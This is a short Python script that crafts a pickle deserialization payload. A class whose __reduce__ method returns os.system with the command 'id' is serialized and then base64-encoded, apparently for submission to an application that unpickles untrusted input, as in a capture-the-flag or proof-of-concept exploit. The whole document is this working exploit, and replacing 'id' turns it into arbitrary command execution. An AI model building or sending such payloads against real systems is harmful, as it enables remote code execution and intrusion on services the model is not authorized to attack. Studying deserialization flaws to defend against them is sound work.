import pickle
import os
import base64

class Pickle(object):
    def __reduce__(self):
        return os.system, ('id',)

o = Pickle()
p = pickle.dumps(o)
print(p)
b= base64.b64encode(p)
print(b)